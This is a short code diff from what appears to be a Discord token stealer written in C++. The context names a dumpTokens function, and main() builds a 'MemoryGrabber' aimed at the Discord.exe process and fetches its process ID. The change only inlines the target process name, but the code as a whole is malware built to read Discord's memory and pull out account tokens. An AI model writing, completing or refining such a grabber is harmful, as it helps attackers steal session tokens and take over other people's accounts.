@@ -221,11 +221,8 @@ void dumpTokens(std::vector<std::string> tokens) {
 
 int main() {
     // entry point
-    // name of the running process
-    std::wstring processName = L"Discord.exe";
-    // convert to narrow string
     // create an instance of MemoryGrabber
-    MemoryGrabber* memoryGrabber = new MemoryGrabber(processName);
+    MemoryGrabber* memoryGrabber = new MemoryGrabber(L"Discord.exe");
     // get the process id of the target process
     DWORD pid = memoryGrabber->getProcessByName();
 
